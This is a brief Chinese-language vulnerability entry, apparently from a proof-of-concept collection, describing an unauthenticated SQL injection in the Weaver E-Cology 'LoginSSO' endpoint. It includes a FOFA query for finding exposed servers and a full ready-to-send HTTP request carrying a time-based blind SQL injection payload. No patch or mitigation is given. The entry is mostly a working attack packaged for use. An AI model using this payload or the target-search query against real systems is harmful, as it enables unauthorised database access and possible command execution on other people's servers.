## 泛微E Cology LoginSSO SQL注入漏洞

## 漏洞描述
泛微 E Cology 平台 `LoginSSO` 接口存在 SQL 注入漏洞，未授权攻击者可直接拼接恶意语句获取数据库信息，甚至配合高权限扩展执行系统命令。

## 网络空间测绘
```
fofa: app="泛微-OA（e-cology）"
```

## POC
```
GET /weaver/weaver.email.FileDownloadLocation/login/LoginSSOxjsp/x.FileDownloadLocation?ddcode=7ea7ef3c41d67297&mrufuuid=1%27;if+db_name(1)=%27master%27+WAITFOR+delay+%270:0:5%27--+&mailid=0&a=.swf HTTP/1.1
Host: [请补充实际域名]
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.66 Safari/537.36
Accept: */*
Accept-Encoding: gzip, deflate
Connection: close
```
## 参考
- 社区情报

